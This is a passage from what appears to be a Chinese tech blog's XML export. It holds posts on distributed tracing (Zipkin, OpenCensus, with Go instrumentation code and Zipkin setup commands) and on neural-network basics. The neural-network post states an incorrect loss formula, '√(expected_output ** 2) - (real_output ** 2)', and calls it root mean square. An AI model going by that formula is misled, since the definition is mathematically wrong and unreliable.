watchman-aspect Storm HBase yes 京东 CallGraph TraceID Agent-&gt;JMQ Storm JimDB（实时）ES、Spark（离线） yes 美团 MTrace TraceID Agent-&gt; Kafka Support Agent Proxy Storm HBase(实时) Hive(离线) yes Exporters | 数据可视化Prometheus|普罗米修斯Stackdriver适用于 Google Cloud Platform 与 AWS 应用的监控、日志记录和诊断工具 SignalFXAmazon AWS X-RayZipkinZipkin 的 Span 模型几乎完全仿造了 Dapper 中的 Span 设计，Zipkin 的 Span 包括基础数据（traceId、spanId、parentId、name、timestamp 和 duration，主要用于表示跟踪树中节点的关联关系）、 Annotation（记录请求特定事件相关信息）、BinaryAnnotation（扩展信息）。 Zipkin 包括四大组件： Zipkin Collector: 处理跟踪数据的守护进程 (validate,store,index)； Storage: 设计之初支持 Cassandra 存储（Twitter 广泛应用），目前也支持 ElasticSearch 和 MySQL； Zipkin Query Service: JSON API； Web UI: 没有内置身份认证。 扩展阅读 | Distributed Tracing with Zipkin and ELK 扩展阅读 | Tracing microservices with Zipkin and Kibana OpenCensus vs OpenTracing Future OpenTracing OpenCensus Google Dapper API 支持 Go、 Python、Javascript、 Objective-CJava、C++ 研发中：PHP 、Ruby Go、Java、C++、.Net，Node.js，Erlang 研发中： Python(STATS In Progress) 、 PHP(STATS Planned) 、 Ruby(STATS Planned) – EXPORTERS – SignalFX (Java、C++) Prometheus (Java、C++、Go、Erlang) Jaeger (Java、Go) Stackdriver (Java、C++、Go、Python、ERLANG-Trace Only) Zipkin (Java、C++、Go、Erlang) Instana (Java) – OpenCensus ROADMAP What is distributed tracing. Zoom on opencensus and opentracing What&#39;s the difference between opencensus and opentracing?&mdash; #GoldenBlackChild 🌟🏆🏅🥇 (@nevi_me) January 17, 2018 Sensor Sensibility FormatThe Sensor Sensibility Format — or SSF for short — is a language agnostic format for transmitting observability data such as trace spans, metrics, events and more. https://github.com/stripe/veneur/tree/master/ssf 管理负载 Managing Tracing Overhead目前多数分布式追踪系统采用异步写入日志、建立缓冲存储（基于内存或者内存数据库）、设置采样阈值策略（包括一定情况下直接丢弃）的方式控制追踪负载。Google Dapper 公布的性能损耗测评数据如下： 淘宝 EagleEye ：1）专属日志输出实现，日志异步写入来避免 hang 住业务线程，可调节日志输出缓冲大小，控制每秒写日志的 IO 次数等。2）全局采样开关，在运行期控制调用链的采样率（根据 TraceId 来决定当前的这一次访问日志是否输出）。比如采样率被设置为 10，一部分调用链日志完全不输出，只有 hash(traceId) mod 10 的值等于0的日志才会输出。例如核心入口的调用量样本空间足够大（每日百万次以上级别），假设统计误差 0.1% ，即使开启1/10的采样总和误差也是可以接受的。 微博 Watchman：如某个服务由于瞬时访问高峰，造成底层资源压力变大从而服务响应时间变长，控制策略可以根据设定随机丢弃后续的请求，如果情况加剧就会自动降级该服务，保证核心服务路径。 扩展阅读分布式追踪系统 DevOps 漫谈：开源分布式跟踪系统 OpenCensus DevOps 漫谈：分布式追踪系统标准体系 远程通信协议：从 CORBA 到 gRPC 应用程序开发中的日志管理(Go语言描述) 动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 开源架构技术漫谈 基于Go语言快速构建一个RESTful API服务 基于Kafka构建事件溯源型微服务 数据可视化（七）Graphite 体系结构详解 DevOps 资讯 | LinkedIn 开源 Kafka Monitor 参考文献 OpenTraing 文档 | 中文 The difference between tracing, tracing, and tracing Using OpenTracing with Istio/Envoy 优步分布式追踪技术再度精进 开放分布式追踪（OpenTracing）入门与 Jaeger 实现 Github | CNCF Jaeger, a Distributed Tracing System OpenTracing: Jaeger as Distributed Tracer Distributed tracing at Pinterest with new open source tools Instrumenting a Go application with Zipkin 分布式跟踪系统（一）：Zipkin的背景和设计 分布式调用跟踪系统调研笔记 Node.js Performance and Highly Scalable Micro-Services - Chris Bailey, IBM 分布式会话跟踪系统架构设计与实践 | 美团点评技术团队 | 志桐 ·2016-10-14 18:13 Metrics, tracing, and logging | 2017 02 21 跟踪 skynet 服务间的消息请求及性能分析 | 云风的Blog]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>OpenSource</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AI技术原理|神经网络基础]]></title>
    <url>%2F2018%2F05%2F07%2FMachine-Learning-Neural-Network%2F</url>
    <content type="text"><![CDATA[摘要 Introduction 工作流程：Forward-Propagation、Backward Propagation、Partial Derivatives、Hyper Parameters 深度网络：A single layer Neural Network、Wide Neural Network vs Deep Neural Network 维度诅咒、权衡 Introduction神经网络试图复制人脑的工作以使事情更加智能化。 神经网络通常是一种有监督的学习方法。这意味着需要有一套训练集。理想情况下，训练集合包含了绝对真值（tags | 标签，classes | 类 ）的例子。例如在文本情感分析的情况下，训练集是句子列表和它们各自对应的情绪。（注意：未标记的数据集也可以用来训练神经网络，但这里仅考虑最基本的情况。） 例如：将文本称为 X ，将它们的标签称为 Y 。 有一些函数可以定义 X 和 Y 之间的关系，比如是什么特征（词/短语/句子结构等）导致一个句子是否定的或肯定的的含义。早期的人们习惯于手动查找这些特征，这被称为特征工程（feature engineering）。神经网络使得这一过程实现自动化处理。 So there are many ways you can understand a concept, choose whichever suits you, being persistent about the learning part. At the end knowing maths is a useful tool when it comes to optimisations or experimentations. 工作流程 人工神经网络由3个组成部分组成： 输入层 Input Layer 隐藏（计算）层 Hidden (computation) Layers 输出层 Output Layer 学习过程分两步进行： 前向传播 Forward-Propagation：猜测答案 反向传播 Back-Propagation：最小化实际答案和猜测答案之间的误差 前向传播 Forward-Propagation 随机初始化权重（Randomly initialize weights） w1 w2 w3输入层的数据乘以权重形成隐藏层 h1 = (x1 * w1) + (x2 * w1) h2 = (x1 * w2) + (x2 * w2) h3 = (x1 * w3) + (x2 * w3)隐藏层的输出通过非线性函数(激活函数)以形成猜测输出(guessed output) y_ = fn( h1 , h2, h3 ) 反向传播 Backward Propagation 总误差 total_error 通过一个代价函数 (cost function) 来计算，参数为计算期望值( expected value ) y（训练集中的值）和观测值(observed value) y_（前向传播值） 按每一个权重计算误差的偏导数（这些偏微分是每一个权重在总误差中的量度） 微分后乘以一个小数 ( η ) ，η 称为学习率（learning rate） 然后从各自的权重中减去结果 反向传播的结果是以下更新的权重： w1 = w1 - (η * ∂(err) / ∂(w1)) w2 = w2 - (η * ∂(err) / ∂(w2)) w3 = w3 - (η * ∂(err) / ∂(w3)) 基本上我们对权重初始化时是随机的，并假设他们会产生准确的答案。 Those familiar with Taylor Series, backpropogation shares the same end result with it. But instead of an indefinite series we try to optimise the first element only. 偏差（Bias）是添加到隐藏层的权重。它们也被随机初始化并以隐藏层相似的方式更新。虽然隐藏层的作用是映射数据中底层函数（underlying function）的模型，但偏差的作用是横向移动学习函数（the learned function），使其与原始函数（the original function）重叠。 偏导数 Partial Derivatives计算偏导数使我们能够知道每个权重对误差的贡献。 导数的需求是显而易见的。例如：假设一个试图找到自动驾驶汽车最佳速度的神经网络。现在，如果汽车发现速度比预期的更快或者更慢，那么神经网络会通过加速或减速来改变速度。什么是加速/减速？速度的导数。 解释偏导数：射飞镖假设有几个孩子被要求向飞镖靶掷飞镖，瞄准中心。最初的结果是： 现在如果我们确认了总误差并简单地从所有权重中减去，那么我们可以概括每个学生的误差。假设一个孩子瞄准的目标太低，但是我们要求所有的孩子都瞄准得更高一些，结果是： 一些学生的错误可能会减少，但总体错误仍然会增加。通过查找偏导数，我们可以找出每个权重单独产生的误差。单独修正每个权重会得到以下结果： 超参数 Hyper Parameters虽然神经网络被用于自动化特征选择，但是仍然有一些参数我们必须手动输入。 学习速率 Learning Rate学习速率是一个非常关键的超参数。如果学习速率太小，那么即使在长时间训练神经网络之后，它仍将远离最优结果。结果看起来像： 相反，如果学习率太高，那么学习者就会过早地得出结论。产生以下结果： 激活函数 Activation Function简单来说，激活函数（激励函数）负责决定哪些神经元将被激活，即什么信息将传递给其他层。没有激活函数，深度神经网络将失去大量的描述学习能力。 这些函数的非线性负责增加学习者的自由度，使他们能够在较低维度上推广高维的问题。下面是一些流行的激活函数的例子： 成本函数 Cost Function成本函数是神经网络的核心。它用于计算真实和观察结果的损失(loss)。我们的目标是尽量减少这种损失。因此，成本函数有效地推动了神经网络对其目标的学习。 成本函数是神经网络做的“有多好”的量度，在给定训练样本和预期输出方面。它也可能取决于变量，如权重(weights)和偏差(biases)。 成本函数是一个单一的值，而不是一个矢量，因为它评价了神经网络作为一个整体的效果。一些最着名的成本函数是： 平方平均数 Quadratic Cost ，简称均方根 Root Mean Square 交叉熵 Cross Entropy 指数 Exponential (AdaBoost) 相对熵 Kullback–Leibler divergence 或者 信息收益 Information Gain 均方根是其中最简单和最常用的。它被简单地定义为： Loss = √(expected_output ** 2) - (real_output ** 2) 神经网络中的成本函数应满足两个条件： 成本函数必须能够写成平均值 成本函数不能取决于除一个神经网络中的输出值以外的的任何激活值 深度网络深度学习是一类机器学习算法，可以从数据中学习更深入（更抽象）的洞察力。 使用级联，类似流水线的依次传递管道，拥有多层处理单元（非线性）进行特征提取和转换。 基于以无监督方式学习数据的特征（表示数据知识）。更高级别的特征（在后面的处理图层中找到）是从更低级别的特征（可在初始处理图层中找到）导出的。 多级表示相对应的不同抽象级别；这些级别构成了概念的层次结构。 单层神经网络 A single layer Neural Network单层神经网络，无论第一层（绿色神经元）如何学习，他们只需将其传递给输出即可。 双层神经网络 Two layer Neural Network对于两层神经网络，无论绿色隐藏层学习什么，都要传递到蓝色隐藏层，进一步学习（关于绿色层学习）。因此，隐藏层的数量越多，对先前已经学习过的概念的学习就越多。 Wide Neural Network vs Deep Neural Network在一层中存在更多神经元的情况下，它不会获得更深层次的洞察力。相反，它的结果是学习到更多的概念。 例：学习英语语法，它需要理解大量的概念。在这种情况下，单层宽神经网络比深度神经网络的效果要好得多，而深度神经网络的宽度要小得多。 但在学习傅立叶变换(Fourier Transform)的情况下，学习者（神经网络）需要深入学习，因为没有太多的概念需要学习，但每个概念都足够复杂，需要深度学习。 Balance is Key 每个任务都使用深度和宽度神经网络是非常诱人的。这可能是一个非常糟糕的主意，因为： 两者都显然需要更多的数据才能达到最低的理想精度（desirable accuracy） 两者都具有成倍增加的时间复杂度（time complexity） 太深的神经网络将尝试更深入地分解一个基本概念，但在这一点上它将对这个概念做出错误的假设，并试图找到不存在的伪模式（pseudo patterns） 太宽的神经网络会试图找到更多数量的特征（可测量特性）。因此，与上面类似，它将开始对数据做出错误的假设。 维度诅咒维度诅咒（The curse of dimensionality）是指在高维空间（通常具有数百或数千维度）中分析和组织数据时出现的各种现象，这些现象在低维设置中不会发生。 像英语语法或股票奖品等有很多影响他们的特征。使用机器学习必须用具有有限和相对小得多的长度（比实际存在的特征的数量）的阵列（array）/ 矩阵（matrix）来表示这些特征。要做到这一点可能产生两个问题： made by a learner：由于学习者的错误假设而出现偏差。高偏差会导致算法错过功能与目标输出之间的相关关系。这种现象被称为欠拟合（underfitting）。 insufficient learning : 由于对特征的了解不全面，训练集中的小波动导致较大偏差。高方差导致过度拟合（overfitting），将错误作为相关信息进行学习。 权衡It is typically impossible to have low bias and low variance. 在训练早期因为网络输出远未达到要求，偏差很大。由于数据影响较小，方差很小。在训练后期因为网络已经学会了潜在的功能，偏差很小。 然而，如果训练太长，网络也将学习该数据集特殊的噪声。这导致在不同数据集上测试的结果表现为高方差，因为不同数据集的噪声存在变化。实际上，具有高偏差的算法通常产生更简单的模型，这些模型不倾向于过度拟合，但可能会削弱其训练数据，而不能捕获重要的模式或特征的属性。具有低偏差和高方差的模型在结构上通常更复杂，使得它们能够更准确地表示训练集。然而，在这一过程中，它们也可能代表训练集中的占比较大的噪声，使得它们的预测尽管复杂性增加，但精度却不太精确。 因此，低偏差和低方差同时存在通常是不可能的。 目前，依靠丰富的数据和工具，我们可以轻松地创建复杂的机器学习模型。如果学习者没有提供足够的信息时，实际上偏差就发生了，处理过度拟合将变成中心工作。如果提供更多的例子，则意味着更多的变化，包括模式的数量都增加了。 扩展阅读《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 Basics of Neural Network | Mukul Malik 为什么需要激励函数 (Activation Function) Building a neural network from scratch in R]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>架构师</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DevOps 漫谈：开源分布式跟踪系统 OpenCensus]]></title>
    <url>%2F2018%2F04%2F27%2FDevOps-OpenCensus%2F</url>
    <content type="text"><![CDATA[摘要 Distributed Tracing and Monitoring System OpenCensus: A framework for distributed tracing OpenCensus Principle: data structure 、Context This article is part of an Distributed Tracing and Monitoring System tutorial series. Make sure to check out my other articles as well: DevOps 漫谈：开源分布式跟踪系统 OpenCensus DevOps 漫谈：分布式追踪系统标准体系 绪论随着互联网技术的高速发展，以往单应用的服务架构已经很难处理如山洪般增长的信息数据，随着云计算技术的大规模应用，以微服务、RESTful 为代表的各种软件架构广泛应用，跨团队、跨编程语言的大规模分布式系统也越来越多。相对而言，现在要理解系统行为，追踪诊断性能问题会复杂得多。 在单应用环境下，业务都在同一个服务器上，如果出现错误和异常只需要盯住一个点，就可以快速定位和处理问题；但是在微服务的架构下，功能模块天然是分布式部署运行的，前后台的业务流会经过很多个微服务的处理和传递，就连日志监控都会成为一个大问题（日志分散在多个服务器、无状态服务下如何查看业务流的处理顺序等），更不要说服务之间还有复杂的交互关系。 用户的一个请求在系统中会经过多个子系统（或者多个微服务）的处理，而且是发生在不同机器甚至是不同集群，当发生异常时需要快速发现问题，并准确定位到是哪个环节出了问题。对系统行为进行跟踪必须持续进行，因为异常的发生是无法预料的，有些甚至难以重现。跟踪需要无所不在，否则可能会遗漏某些重要的故障点。 为了解决上述问题，分布式跟踪系统 —— 一种帮助理解分布式系统行为、帮助分析性能问题的工具应运而生。 第一部分 Google Dapper : Distributed Tracing and Monitoring System Modern Internet services are often implemented as complex, large-scale distributed systems.These applications are constructed from collections of software modules that may be developed by different teams, perhaps in different programming languages, and could span many thousands of machines across multiple physical facilities. Tools that aid in understanding system behavior and reasoning about performance issues are invaluable in such an environment. 在分布式追踪领域著名的论文《Dapper, a Large-Scale Distributed Systems Tracing Infrastructure|Google Technical Report dapper-2010-1, April 2010》 Google 工程师提出了关于分布式跟踪系统的一些重要概念： Annotation-based，基于标注或植入点(埋点)在应用程序或中间件中明确定义全局标注（Annotation），一个特殊的ID，通过这个 ID 连接每一条请求记录。当然，这需要代码植入，在生产环境中可以通过一个通用组件开放给开发人员。 跟踪树（trace tree）和 span在 Dapper 跟踪树中，基本单元是树节点（分配 spanid）。节点之间通过连线表示父子关系，通过 parentId 和 spanId 把所有的关系串联起来，实现记录业务流的作用。 第二部分 OpenCensus: A framework for distributed tracing OpenCensus is a framework for stats collection and distributed tracing. Google Dapper 的定位更准确的说是分析系统，并不能解决从生产服务中提取数据的难题，OpenCensus 项目为此提供了解决方案。 OpenCensus 项目是 Google 开源的一个用来收集和追踪应用指标的第三方库。OpenCensus 能够提供了一套统一的测量工具：跨服务捕获跟踪跨度（span）、应用级别指标以及来自其他应用的元数据（例如日志）。OpenCensus 有如下一些主要特点： 标准通信协议和一致的 API ：用于处理 metric 和 trace 多语言库，包括Java，C++，Go，.Net，Python，PHP，Node.js，Erlang 和 Ruby 与 RPC 框架的集成，可以提供开箱即用的追踪和指标。 集成的存储和分析工具 完全开源，支持第三方集成和输出的插件化 不需要额外的服务器或守护进程来支持 OpenCensus In process debugging：一个可选的代理程序，用于在目标主机上显示请求和指标数据 OpenCensus ConceptsTags | 标签OpenCensus 允许系统在记录时将度量与维度相关联。记录的数据使我们能够从各种不同的角度分析测量结果，即使在高度互连和复杂的系统中也能够应付。标签以键值对的形式在上下文中传递，并且允许在当前上下文中添加或修改。 1234ctx, err = tag.New(ctx, tag.Insert(osKey, "macOS-10.12.5"), tag.Upsert(userIDKey, "cde36753ed"),) Stats | 统计Stats 收集库和应用程序记录的测量结果，汇总、导出统计数据。为了实现低开销（ a low-overhead framework even if instrumentation is always enabled ），数据点记录和数据聚合是分离的，OpenCensus 统计收集分两个阶段进行： 测量的定义和数据点的记录 | Definition of measures and recording of data points 视图的定义和记录数据的聚合 | Definition of views and aggregation of the recorded data Recording | 记录量度 (Measurements) 是与测量相关联的数据点。(Measurements are data points associated with a measure.)记录 (Recording) 利用上下文中所提供的标签隐式地标记量度集合。(Recording implicitly tags the set of Measurements with the tags from the provided context.) 1stats.Record(ctx, videoSize.M(102478)) Trace | 跟踪Trace 是嵌套 Span (跨度)的集合。Trace 包括单个用户请求的处理进度，直到用户请求得到响应。Trace 通常跨越分布式系统中的多个节点。跟踪由 TraceId 唯一标识， Trace 中的所有 Span 都具有相同的 TraceId 。 一个 Span 代表一个操作或一个工作单位。多个 Span 可以是“Trace”的一部分，它代表跨多个进程/节点的执行路径（通常是分布式的）。同一轨迹内的 Span 具有相同的 TraceId。 12ctx, span := trace.StartSpan(ctx, "your function name")defer span.End() 视图 | Views视图用于聚合测量结果。你可以把它们看作是对记录数据点（量度）集合的查询。视图包括两个部分：分组标签（group by）和聚合类型（aggregation type）。目前 OpenCensus ( Golang API ) 支持三种类型的聚合： CountAggregation 用于记录被抽样的次数； DistributionAggregation 用于提供包含一系列样本值的直方图； SumAggregation 用于汇总所有样本值。 123distAgg := view.Distribution(0, 1&lt;&lt;32, 2&lt;&lt;32, 3&lt;&lt;32)countAgg := view.Count()sumAgg := view.Sum() 示例：创建一个视图（ DistributionAggregation，指标 “videoSize” ）12345678if err := view.Register(&amp;view.View&#123; Name: "my.org/video_size_distribution", Description: "distribution of processed video size over time", Measure: videoSize, Aggregation: view.Distribution(0, 1&lt;&lt;32, 2&lt;&lt;32, 3&lt;&lt;32),&#125;); err != nil &#123; log.Fatalf("Failed to subscribe to view: %v", err)&#125; Introspection | 内省OpenCensus 提供在线仪表板，显示进程中的诊断数据。这些页面被称为 z-pages ，它们有助于了解如何查看来自特定进程的数据，而不必依赖任何度量收集器或分布式跟踪后端。 OpenCensus Examples创建指标 定义指标类型 定义显示方式 Track Metrics 一般需要考虑服务负载（Server Load）、响应时间（Response Time）、误码率(Error Rates)等。 实例： opencensus-go-examples-helloworld opencensus-java-examples “Hello, world!” for web servers in Go with OpenCensus 1234567891011121314151617181920212223242526import ( "go.opencensus.io/stats" "go.opencensus.io/tag" "go.opencensus.io/stats/view")var ( requestCounter *stats.Float64Measure codeKey tag.Key DefaultLatencyDistribution = view.DistributionAggregation&#123;0, 1, 2, 3, 4, 5, 6, 8, 10, 13, 16, 20, 25, 30, 40, 50, 65, 80, 100, 130, 160, 200, 250, 300, 400, 500, 650, 800, 1000, 2000, 5000, 10000, 20000, 50000, 100000&#125;) codeKey, _ = tag.NewKey("banias/keys/code") requestCounter, _ = stats.Float64("banias/measures/request_count", "Count of HTTP requests processed", stats.UnitNone) view.Subscribe( &amp;view.View&#123; Name: "request_count", Description: "Count of HTTP requests processed", TagKeys: []tag.Key&#123;codeKey&#125;, Measure: requestCounter, Aggregation: view.CountAggregation&#123;&#125;, &#125;) // requestlatency ..... view.SetReportingPeriod(1 * time.Second) 收集指标数据 Call the Record method 1234567891011121314151617// Go Code Example// 说明：defer 用于资源的释放，会在函数返回之前进行调用。// 如果有多个 defer表达式，调用顺序类似于栈，越后面的 defer 表达式越先被调用。func (c *Collector) Collect(ctx *fasthttp.RequestCtx) &#123; defer func(begin time.Time) &#123; responseTime := float64(time.Since(begin).Nanoseconds() / 1000) occtx, _ := tag.New(context.Background(), tag.Insert(codeKey, strconv.Itoa(ctx.Response.StatusCode())), ) stats.Record(occtx, requestCounter.M(1)) stats.Record(occtx, requestlatency.M(responseTime)) &#125;(time.Now()) /*do some stuff */&#125; 第三方数据接口 | ExporterOpenCensus 是独立于供应商的。OpenCensus 收集和跟踪的应用指标可以在本地显示，也可将其发送到第三方分析工具或监控系统实现可视化，例如： Prometheus|普罗米修斯 Stackdriver|适用于 Google Cloud Platform 与 AWS 应用的监控、日志记录和诊断工具 | 示例 Zipkin OpenCensus Tracing with Uber’s Jaeger project 1234567891011121314151617181920212223242526272829303132333435363738 import ( "go.opencensus.io/exporter/prometheus" "go.opencensus.io/exporter/stackdriver" openzipkin "github.com/openzipkin/zipkin-go" "go.opencensus.io/exporter/zipkin" xray "github.com/census-instrumentation/opencensus-go-exporter-aws" "go.opencensus.io/trace" "go.opencensus.io/stats/view")// Opention: Export to Prometheus Monitoring. Exporter, err := prometheus.NewExporter(prometheus.Options&#123;&#125;)if err != nil &#123; logger.Error("Error creating prometheus exporter ", zap.Error(err))&#125;view.RegisterExporter(pExporter) // Opention: Export to Stackdriver Monitoring.sExporter, err := stackdriver.NewExporter(stackdriver.Options&#123;ProjectID: config.ProjectID&#125;)if err != nil &#123; logger.Error("Error creating stackdriver exporter ", zap.Error(err))&#125;view.RegisterExporter(sExporter) // Opention: Export to Zipkin Monitoring.localEndpoint, err := openzipkin.NewEndpoint("service-A", "127.0.1.1:8080")reporter := http.NewReporter("http://127.0.1.110:9411/api/v2/spans")defer reporter.Close()exporter := zipkin.NewExporter(reporter, localEndpoint)trace.RegisterExporter(exporter) // Opention: Export to AWS X-Rayxe, err := xray.NewExporter(xray.WithVersion("latest"))if err != nil &#123; log.Fatalf("Failed to create AWS X-Ray exporter: %v", err)&#125;trace.RegisterExporter(xe) 数据可视化 函数内容为空（微秒级） 串行调用函数方法，内容包括网络访问和持久化操作（毫秒级） 并行调用函数方法（Go routine），内容与上同 串行/并行混合调用 123456go go_ping(ctx, "192.168.213.128", 2, time.Second*3, false)go go_ping(ctx, "192.168.213.128", 2, time.Second*3, false)go go_ping(ctx, "192.168.213.129", 2, time.Second*5, false)go_ping(ctx, "192.168.213.128", 2, time.Second*3, false)go_ping(ctx, "192.168.213.128", 2, time.Second*3, false)go_ping(ctx, "192.168.213.128", 2, time.Second*3, false) 多服务调用 第三部分：OpenCensus Principle | 工作原理 (待续)数据结构Span 共有属性： TraceId SpanId Start Time End Time Status Span 可选属性： Parent SpanId Remote Parent Attributes Annotations Message Events Links 12345678910111213141516171819202122232425//go.opencensus.io/trace.gotype Span struct &#123; // data contains information recorded about the span. // // It will be non-nil if we are exporting the span or recording events for it. // Otherwise, data is nil, and the Span is simply a carrier for the // SpanContext, so that the trace ID is propagated. data *SpanData // protects the contents of *data (but not the pointer value.) mu sync.Mutex spanContext SpanContext // spanStore is the spanStore this span belongs to, if any, otherwise it is nil. *spanStore endOnce sync.Once executionTracerTaskEnd func()&#125;type SpanContext struct &#123; TraceID TraceID SpanID SpanID TraceOptions TraceOptions&#125; 上下文 Context 上下文 Context 按照树型关系构建。以 Golang 为例，创建 Context 树第一步就是通过 context.Background() 得到根节点，再由 WithCancel()、WithTimeout() 等函数创建其它的子节点，孙节点。子节点从父节点复制得到，在子节点也可以设定新的状态值，如此就可以使元数据在子节点之间层层传递。 12345678910func Background() Contextfunc WithCancel(parent Context) (ctx Context, cancel CancelFunc)func WithDeadline(parent Context, deadline time.Time) (Context, CancelFunc)func WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc)func WithValue(parent Context, key interface&#123;&#125;, val interface&#123;&#125;) Context gRPC Client 12345678910conn, err := grpc.Dial(address, grpc.WithStatsHandler(&amp;ocgrpc.ClientHandler&#123;&#125;), grpc.WithInsecure())defer conn.Close()c := pb.NewGreeterClient(conn)...for &#123; r, err := c.SayHello(context.Background(), &amp;pb.HelloRequest&#123;Name: name&#125;)&#125; gRPC Server 1234567// SayHello implements helloworld.GreeterServerfunc (s *server) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) &#123; ctx, span := trace.StartSpan(ctx, "sleep") time.Sleep(time.Duration(rand.Float64() * float64(time.Second))) span.End() return &amp;pb.HelloReply&#123;Message: "Hello " + in.Name&#125;, nil&#125; go.opencensus.io/trace.go 源码 12345678910111213141516171819202122232425//go.opencensus.io/trace.go// StartSpan starts a new child span of the current span in the context. If// there is no span in the context, creates a new trace and span.func StartSpan(ctx context.Context, name string, o ...StartOption) (context.Context, *Span) &#123; var opts StartOptions var parent SpanContext if p := FromContext(ctx); p != nil &#123; parent = p.spanContext &#125; for _, op := range o &#123; op(&amp;opts) &#125; span := startSpanInternal(name, parent != SpanContext&#123;&#125;, parent, false, opts) ctx, end := startExecutionTracerTask(ctx, name) span.executionTracerTaskEnd = end return NewContext(ctx, span), span&#125;// FromContext returns the Span stored in a context, or nil if there isn't one.func FromContext(ctx context.Context) *Span &#123; s, _ := ctx.Value(contextKey&#123;&#125;).(*Span) return s&#125; 视图 注册-订阅 模式 视图注册之后开始收集给定的数据。一旦该视图被订阅，它就向已注册的 Exporter 报送数据。 1234567891011121314151617// source code : go.opencensus.io/view/worker.go// Register begins collecting data for the given views.// Once a view is subscribed, it reports data to the registered exporters.func Register(views ...*View) error &#123; for _, v := range views &#123; if err := v.canonicalize(); err != nil &#123; return err &#125; &#125; req := &amp;registerViewReq&#123; views: views, err: make(chan error), &#125; defaultWorker.c &lt;- req return &lt;-req.err&#125; Exporter1234567891011121314151617181920// source: go.opencensus.io/trace/export.go// SpanData contains all the information collected by a Span.type SpanData struct &#123; SpanContext ParentSpanID SpanID SpanKind int Name string StartTime time.Time // The wall clock time of EndTime will be adjusted to always be offset // from StartTime by the duration of the span. EndTime time.Time // The values of Attributes each have type string, bool, or int64. Attributes map[string]interface&#123;&#125; Annotations []Annotation MessageEvents []MessageEvent Status Links []Link HasRemoteParent bool&#125; OpenCensu 资讯Microsoft joins the OpenCensus project | June 13,2018 We are happy to announce that Microsoft is joining the open source OpenCensus project, originally initiated and shepherded by Google, and we are excited to help it achieve the goal of “a single distribution of libraries for metrics and distributed tracing with minimal overhead.” 微软宣布加入开源项目 OpenCensus —— 最初是由 Google 发起和主导，旨在建立一个低开销的分布式追踪和度量库。 现代基于云的应用程序通常是分布式的, 需要专门的监测和追踪技术来跟踪定位故障和性能问题。Azure 应用程序内置 Application Map，应用程序映射|会审分布式应用程序 和 End-to-End Transaction Diagnostics，端到端跨组件事务诊断功能。但是目前的监测工具体系中缺乏一个标准化的平台来实现度量和分布式跟踪, 这些数据需要支持跨编程语言和技术栈。微软宣称将利用自己的经验和知识与 OpenCensus 社区合作, 在应用程序度量和分布式跟踪领域创建一个开放和可扩展的标准平台, 从而使所有客户受益。 Our goal is to leverage our experience and knowledge and combine it with that of OpenCensus community to create an open and extensible, standard platform for application metrics and distributed traces that will benefit all customers. Application Map，应用程序映射|会审分布式应用程序 应用程序映射可帮助发现性能瓶颈或热点失败的所有组件的分布式应用程序。在地图上的每个节点表示应用程序组件或其依赖项;并且有运行状况 KPI 和警报状态。可从任何组件单击以获得更详细的诊断，如 Application Insights 事件。 如果应用使用了 Azure 服务，还可以单击获得 Azure 诊断，如 SQL 数据库顾问建议。 End-to-End Transaction Diagnostics，端到端跨组件事务诊断 事务诊断功能将所有受 Application Insights 监视的组件中的服务器端遥测关联到一个单独的视图。Application Insights 可检测基础关系，并可用于诊断导致事务缓慢或失败的应用程序组件、依赖项或异常。 Tips OpenCensus People OpenZipkin QuickStart Docker12345$ docker image pull openzipkin/zipkin$ docker run -d -p 9411:9411 openzipkin/zipkin$ docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES65d6aa99ea41 openzipkin/zipkin "/bin/bash -c 'test …" 57 seconds ago Up 56 seconds 9410/tcp, 0.0.0.0:9411-&gt;9411/tcp zealous_shockley Source1234567# get the latest sourcegit clone https://github.com/openzipkin/zipkincd zipkin# Build the server and also make its dependencies./mvnw -DskipTests --also-make -pl zipkin-server clean install# Run the serverjava -jar ./zipkin-server/target/zipkin-server-*exec.jar 12345678910111213141516171819202122232425********** *** *** **** **** **** ********** **** ******** ********** **** ************************************************************************************** **** ******* **** ** ******* ** ***** ** ** ** ** **** ** ** * *** ** **** **** ** ***** **** ** ** ********* ** ** ** ** ** ** **:: Powered by Spring Boot :: (v2.0.1.RELEASE) 扩展阅读分布式追踪系统 DevOps 漫谈：开源分布式跟踪系统 OpenCensus DevOps 漫谈：分布式追踪系统标准体系 远程通信协议：从 CORBA 到 gRPC 应用程序开发中的日志管理(Go语言描述) 动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 开源架构技术漫谈 基于Go语言快速构建一个RESTful API服务 基于Kafka构建事件溯源型微服务 数据可视化（七）Graphite 体系结构详解 DevOps 资讯 | LinkedIn 开源 Kafka Monitor 参考文献 “Hello, world!” for web servers in Go with OpenCensus OpenCensus: A Stats Collection and Distributed Tracing Framework | Wednesday, January 17, 2018 | Google Open Source Blog OpenCensus for Go gRPC developers Uber正式开源其分布式跟踪系统Jaeger | 2017年11月9日 Uber优步分布式追踪技术再度精进 Measure Once — Export Anywhere: OpenCensus in the wild opencensus-go-examples-helloworld-context MongoDB driver instrumented with OpenCensus in Go Go语言并发模型：使用 context | oscarzhao 2016年08月29日 理解Go 